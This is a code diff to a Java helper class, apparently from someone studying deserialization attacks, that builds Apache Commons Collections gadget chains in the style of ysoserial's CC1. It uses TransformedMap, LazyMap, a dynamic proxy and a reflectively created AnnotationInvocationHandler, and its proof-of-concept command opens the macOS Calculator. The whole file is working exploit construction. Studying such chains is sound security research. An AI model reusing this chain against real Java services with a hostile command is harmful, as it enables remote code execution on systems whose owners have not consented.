@@ -28,7 +28,7 @@ import static expUtils.ReflectUtils.getClassByte;
 
 public class ExpUtils {
 
-    private static String cmd = "/System/Applications/Calculator.app/Contents/MacOS/Calculator";
+    private static final String cmd = "/System/Applications/Calculator.app/Contents/MacOS/Calculator";
 
     public static TemplatesImpl getEvilTemplates() throws NoSuchFieldException, IllegalAccessException, IOException {
         TemplatesImpl templates = new TemplatesImpl();
@@ -120,28 +120,46 @@ public class ExpUtils {
 //    获取恶意transformMap
     public static Map getEvilTransformMap(){
         Map<String,String> innerMap = new HashMap<String,String>();
-//        这里的key 不是乱写的，不然不会触发。
+//        这里的key 必须是value，方便触发 AnnotationInnocationHandler setvalue方法。
         innerMap.put("value","value12312312");
         return TransformedMap.decorate(innerMap,null,getEvilChainedTransformer());
     }
     //
-    public static Map getEvilLazyMap() throws InvocationTargetException, NoSuchMethodException, ClassNotFoundException, InstantiationException, IllegalAccessException {
-        Map<String,String> innerMap = new HashMap<>();
-        LazyMap lazyMap = (LazyMap) LazyMap.decorate(innerMap, getEvilChainedTransformer());
-        Map finalLazyMap = (Map) Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(),lazyMap.getClass().getInterfaces(),getAnnotationHandler(lazyMap));
+    public static Map getEvilProxyLazyMap() throws InvocationTargetException, NoSuchMethodException, ClassNotFoundException, InstantiationException, IllegalAccessException {
+        LazyMap lazyMap = (LazyMap) getEvilLazyMap();
+        Map finalLazyMap = (Map) Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(),lazyMap.getClass().getInterfaces(),getAnnotationHandler2(lazyMap));
         return finalLazyMap;
+    }
+
+    public static Map getEvilLazyMap(){
+        Map<String,String> innerMap = new HashMap<>();
+        innerMap.put("outer","2222");
+        return LazyMap.decorate(innerMap, getEvilChainedTransformer());
     }
 
 //    ysoserial cc1
     public static Object getCC1Exp() throws ClassNotFoundException, NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
-        return getAnnotationHandler(getEvilLazyMap());
+        return getAnnotationHandler(getEvilProxyLazyMap());
+    }
+
+//    动态代理使用的handler
+    public static InvocationHandler getAnnotationHandler2(Map map) throws IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchMethodException, ClassNotFoundException {
+        Map<String,String> innerMap = new HashMap<>();
+        innerMap.put("prxoy","1111");
+        map = LazyMap.decorate(innerMap, getEvilChainedTransformer());
+
+        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
+        Constructor constructor =  clazz.getDeclaredConstructor(Class.class,Map.class);
+        constructor.setAccessible(true);
+        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class, map);
+        return handler;
     }
 
     public static InvocationHandler getAnnotationHandler(Map map) throws IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchMethodException, ClassNotFoundException {
         Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
         Constructor constructor =  clazz.getDeclaredConstructor(Class.class,Map.class);
         constructor.setAccessible(true);
-        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class, map);
+        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Retention.class, map);
         return handler;
     }
 
@@ -154,16 +172,9 @@ public class ExpUtils {
 
 
     public static void main(String[] args) throws IllegalAccessException, NoSuchFieldException, IOException, ClassNotFoundException, NoSuchMethodException, InstantiationException, InvocationTargetException {
-       Map evilMap = getEvilLazyMap();
-       evilMap.entrySet();
-
-//        AnnotationType annotationType = AnnotationType.getInstance(Retention.class);
-//        Map var6 = annotationType.memberTypes();
-
-        //        System.out.println(System.getProperty("java.version"));
-//        Object obj = getCC1Exp();
-//        unserialize(serialize(obj));
-
+//
+        Map.Entry entry = (Map.Entry) getEvilTransformMap().entrySet().iterator().next();
+        entry.setValue("123");
 
     }
 }
